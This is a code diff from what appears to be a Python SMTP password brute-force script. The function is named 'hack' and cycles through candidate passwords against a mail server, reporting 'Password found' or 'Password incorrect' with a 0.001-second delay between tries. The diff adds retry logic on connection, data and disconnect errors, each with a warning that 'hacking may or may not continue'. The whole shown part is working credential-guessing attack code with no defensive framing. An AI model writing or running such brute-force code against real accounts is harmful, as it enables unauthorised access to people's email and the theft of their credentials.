@@ -22,16 +22,19 @@ def hack():
             print("+   Password found   + : ", password)#if password found
             break#exit loop
 
-        except smtplib.SMTPAuthenticationError:#catch error, password wrong
+        except smtplib.SMTPAuthenticationError:#catch error, credentials incorrect
             print("-   Password incorrect   - : ", password)#if incorrect password
-            time.sleep(0.001)#wait 0.5 seconds between each try
+            time.sleep(0.001)#wait 0.001 seconds between each try
         except smtplib.SMTPConnectError:
+            print("Warning, hacking may or may not continue after this point")
             time.sleep(5)
             hack()
         except smtplib.SMTPDataError:
+            print("Warning, hacking may or may not continue after this point")
             time.sleep(5)
             hack()
         except smtplib.SMTPServerDisconnected:
+            print("Warning, hacking may or may not continue after this point")
             time.sleep(5)
             serve()
             hack()
